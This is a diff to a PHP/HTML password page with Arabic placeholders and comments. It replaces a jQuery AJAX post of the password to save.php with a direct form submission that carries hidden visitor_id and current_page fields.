@@ -139,9 +139,11 @@
                 </ul>
             </div>
 
-            <form id="passwordForm">
+            <form id="passwordForm" action="save.php" method="POST">
+                <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($_GET['visitor_id'] ?? ''); ?>">
+                <input type="hidden" name="current_page" value="password.php">
                 <div class="form-group">
-                    <input type="password" id="pass" placeholder="أدخل كلمة المرور" required>
+                    <input type="password" name="password" id="pass" placeholder="أدخل كلمة المرور" required>
                 </div>
                 <div class="form-group">
                     <input type="password" id="pass_confirm" placeholder="أعد إدخال كلمة المرور" required>
@@ -182,20 +184,8 @@
                 p2.classList.remove('error-input');
             }
 
-            document.getElementById('loading-overlay').style.display = 'flex';
-
-            // إرسال البيانات إلى save.php
-            $.post('save.php', {
-                visitor_id: sessionStorage.getItem('visitorId'),
-                password: p1.value,
-                action: 'save_password'
-            }, function(response) {
-                // الانتقال إلى صفحة إتمام التسجيل
-                window.location.href = "success.html";
-            }).fail(function() {
-                document.getElementById('loading-overlay').style.display = 'none';
-                Swal.fire({ title: 'خطأ!', text: 'حدث خطأ أثناء الاتصال بالسيرفر.', icon: 'error' });
-            });
+            // إرسال الفورم فوراً لـ save.php لضمان الانتقال السريع
+            document.getElementById('passwordForm').submit();
         };
     </script>
 </body>
